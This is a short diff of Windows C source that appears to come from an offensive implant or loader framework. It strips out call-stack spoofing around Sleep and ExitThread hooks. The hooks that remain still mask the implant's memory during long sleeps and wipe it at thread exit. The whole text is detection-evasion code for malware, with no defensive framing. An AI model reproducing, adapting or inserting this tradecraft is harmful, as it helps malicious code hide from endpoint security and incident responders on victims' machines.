@@ -1,7 +1,6 @@
 #include <windows.h>
 #include "memory.h"
 #include "mask.h"
-#include "spoof.h"
 #include "cleanup.h"
 #include "tcg.h"
 
@@ -48,21 +47,8 @@ void setup_memory ( MEMORY_LAYOUT * layout )
     }
 }
 
-/* 
- * throw these hooks in here because
- * sharing a global across multiple
- * modules is still a bit of a headache
- */
-
-VOID WINAPI _Sleep ( DWORD dwMilliseconds )
+VOID WINAPI _SleepWithMaskMemory ( DWORD dwMilliseconds )
 {
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
-    call.argc = 1;
-    
-    call.args [ 0 ] = spoof_arg ( dwMilliseconds );
-
     /*
      * for performance reasons, only mask
      * memory if sleep time is equal to
@@ -73,25 +59,16 @@ VOID WINAPI _Sleep ( DWORD dwMilliseconds )
         mask_memory ( &g_memory, TRUE );
     }
 
-    spoof_call ( &call );
+    KERNEL32$Sleep ( dwMilliseconds );
 
     if ( dwMilliseconds >= 1000 ) {
         mask_memory ( &g_memory, FALSE );
     }
 }
 
-VOID WINAPI _ExitThread ( DWORD dwExitCode )
+VOID WINAPI _ExitThreadWithCleanupMemory ( DWORD dwExitCode )
 {
     /* free memory */
     cleanup_memory ( &g_memory );
-
-    /* call the real exit thread */
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( KERNEL32$ExitThread );
-    call.argc = 1;
-    
-    call.args [ 0 ]  = spoof_arg ( dwExitCode );
-
-    spoof_call ( &call );
+    KERNEL32$ExitThread ( dwExitCode );
 }
